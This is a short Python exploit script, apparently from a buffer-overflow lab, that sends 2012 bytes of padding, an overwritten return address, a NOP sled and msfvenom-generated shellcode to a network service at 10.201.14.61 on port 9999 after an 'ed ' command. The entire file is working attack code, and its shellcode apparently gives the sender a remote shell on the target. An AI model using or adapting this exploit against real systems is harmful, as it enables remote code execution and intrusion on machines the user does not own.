import socket, time, sys
offset = 2012

#for python3, socket requests bytes to send, so add b""; when use msfvenom to generate shell payload, the os type should corresponding to the target hsot OS.

payload=(b"\xdb\xdc\xb8\x6c\xda\x1f\xf2\xd9\x74\x24\xf4\x5b\x29\xc9"
b"\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xaf\xde\xfd\x07\xd3"
b"\x37\x83\xe8\x2b\xc8\xe4\x61\xce\xf9\x24\x15\x9b\xaa\x94"
b"\x5d\xc9\x46\x5e\x33\xf9\xdd\x12\x9c\x0e\x55\x98\xfa\x21"
b"\x66\xb1\x3f\x20\xe4\xc8\x13\x82\xd5\x02\x66\xc3\x12\x7e"
b"\x8b\x91\xcb\xf4\x3e\x05\x7f\x40\x83\xae\x33\x44\x83\x53"
b"\x83\x67\xa2\xc2\x9f\x31\x64\xe5\x4c\x4a\x2d\xfd\x91\x77"
b"\xe7\x76\x61\x03\xf6\x5e\xbb\xec\x55\x9f\x73\x1f\xa7\xd8"
b"\xb4\xc0\xd2\x10\xc7\x7d\xe5\xe7\xb5\x59\x60\xf3\x1e\x29"
b"\xd2\xdf\x9f\xfe\x85\x94\xac\x4b\xc1\xf2\xb0\x4a\x06\x89"
b"\xcd\xc7\xa9\x5d\x44\x93\x8d\x79\x0c\x47\xaf\xd8\xe8\x26"
b"\xd0\x3a\x53\x96\x74\x31\x7e\xc3\x04\x18\x17\x20\x25\xa2"
b"\xe7\x2e\x3e\xd1\xd5\xf1\x94\x7d\x56\x79\x33\x7a\x99\x50"
b"\x83\x14\x64\x5b\xf4\x3d\xa3\x0f\xa4\x55\x02\x30\x2f\xa5"
b"\xab\xe5\xe0\xf5\x03\x56\x41\xa5\xe3\x06\x29\xaf\xeb\x79"
b"\x49\xd0\x21\x12\xe0\x2b\xa2\x17\xfb\x5a\x69\x40\x01\x9c"
b"\xaf\xe5\x8c\x7a\xc5\x15\xd9\xd5\x72\x8f\x40\xad\xe3\x50"
b"\x5f\xc8\x24\xda\x6c\x2d\xea\x2b\x18\x3d\x9b\xdb\x57\x1f"
b"\x0a\xe3\x4d\x37\xd0\x76\x0a\xc7\x9f\x6a\x85\x90\xc8\x5d"
b"\xdc\x74\xe5\xc4\x76\x6a\xf4\x91\xb1\x2e\x23\x62\x3f\xaf"
b"\xa6\xde\x1b\xbf\x7e\xde\x27\xeb\x2e\x89\xf1\x45\x89\x63"
b"\xb0\x3f\x43\xdf\x1a\xd7\x12\x13\x9d\xa1\x1a\x7e\x6b\x4d"
b"\xaa\xd7\x2a\x72\x03\xb0\xba\x0b\x79\x20\x44\xc6\x39\x40"
b"\xa7\xc2\x37\xe9\x7e\x87\xf5\x74\x81\x72\x39\x81\x02\x76"
b"\xc2\x76\x1a\xf3\xc7\x33\x9c\xe8\xb5\x2c\x49\x0e\x69\x4c"
b"\x58"
)

pad = b"\x90"*16
buffer= b"A"*offset +b"\xdf\x14\x50\x62" +pad+  payload
#print(buffer)

#try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('10.201.14.61',9999))
data1=s.recv(1024)
print(data1.decode())
data2 = s.recv(1024)     #catch all received data when buff the offset.
print(data2.decode())

#s.send("ed ".encode())
s.send(b"ed ")
time.sleep(0.3)
data3 = s.recv(1024)
print(data3.decode())
print(buffer)
#s.send(bytes(buffer, 'latin-1'))
#s.send(buffer.encode())
s.send(buffer)
time.sleep(1)
#data4 = s.recv(1024)
#print(data4.decode())
print("Done..")
s.close()
#except:
#    print("Error..")
